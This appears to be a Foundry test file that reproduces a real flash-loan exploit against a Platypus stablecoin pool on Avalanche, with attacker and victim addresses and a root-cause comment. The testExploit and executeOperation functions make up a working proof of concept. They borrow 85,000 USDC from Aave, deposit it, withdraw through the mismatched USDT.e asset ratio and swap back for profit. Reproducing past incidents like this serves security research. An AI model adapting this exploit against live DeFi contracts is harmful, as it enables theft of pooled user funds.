// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~51K USD$
// Attacker : https://snowtrace.io/address/0xc64afc460290ed3df848f378621b96cb7179521a
// Attack Contract : https://snowtrace.io/address/0x16a3c9e492dee1503f46dea84c52c6a0608f1ed8
// Vulnerable Contract : https://polygonscan.com/address/0x9c80a455ecaca7025a45f5fa3b85fd6a462a447b
// Attack Tx : https://snowtrace.io/tx/0x4b544e5ffb0420977dacb589a6fb83e25347e0685275a3327ee202449b3bfac6 mutiple txs

// @Info
// Vulnerable Contract Code : https://snowtrace.io/address/0x7e1333a39abed9a5664661957b80ba01d2702b1e#code

// @Analysis
// Twitter Guy : https://twitter.com/peckshield/status/1678800450303164431
// Root Cause
// Deposit according to the USDC-LP within the ratio to calculate the deposit USDC amount.
// Withdrawal when the amount of USDC-LP to take with the USDT.e-LP inside the ratio to do the calculation of withdrawal amount
// the two pools (USDC-LP, USDT.e-LP) in the ratio is close, but in fact is not the same, arbitrage or attack?

interface IPlatypusPool {
    function deposit(address token, uint256 amount, address to, uint256 deadline) external returns (uint256);

    function withdrawFromOtherAsset(
        address initialToken,
        address wantedToken,
        uint256 liquidity,
        uint256 minimumAmount,
        address to,
        uint256 deadline
    ) external returns (uint256);

    function swap(
        address fromToken,
        address toToken,
        uint256 fromAmount,
        uint256 minimumToAmount,
        address to,
        uint256 deadline
    ) external returns (uint256, uint256);
}

contract ContractTest is Test {
    IERC20 USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    IERC20 USDTe = IERC20(0xc7198437980c041c805A1EDcbA50c1Ce5db95118);
    IERC20 LP_USDC = IERC20(0x06f01502327De1c37076Bea4689a7e44279155e9);
    IPlatypusPool PlatypusPool = IPlatypusPool(0xbe52548488992Cc76fFA1B42f3A58F646864df45);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);

    function setUp() public {
        vm.createSelectFork("Avalanche", 32_470_736);
        vm.label(address(USDTe), "USDTe");
        vm.label(address(USDC), "USDC");
        vm.label(address(LP_USDC), "LP_USDC");
        vm.label(address(aaveV3), "aaveV3");
        vm.label(address(PlatypusPool), "PlatypusPool");
    }

    function testExploit() public {
        aaveV3.flashLoanSimple(address(this), address(USDC), 85_000 * 1e6, new bytes(0), 0);

        emit log_named_decimal_uint(
            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
        );
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initator,
        bytes calldata params
    ) external payable returns (bool) {
        USDC.approve(address(aaveV3), amount + premium);

        USDC.approve(address(PlatypusPool), USDC.balanceOf(address(this)));
        PlatypusPool.deposit(address(USDC), USDC.balanceOf(address(this)), address(this), block.timestamp); // deposit USDC
        LP_USDC.approve(address(PlatypusPool), LP_USDC.balanceOf(address(this)));
        PlatypusPool.withdrawFromOtherAsset(
            address(USDC), address(USDTe), LP_USDC.balanceOf(address(this)), 0, address(this), block.timestamp
        ); // withdraw USDC-LP from USDT.e-LP , calculate the amount of USDT.e to withdraw base on USDT.e-LP ratio, which different from USDC-LP's ratio

        USDTe.approve(address(PlatypusPool), USDTe.balanceOf(address(this)));
        PlatypusPool.swap(
            address(USDTe), address(USDC), USDTe.balanceOf(address(this)), 0, address(this), block.timestamp
        ); // swap USDT.e to USDC

        return true;
    }
}
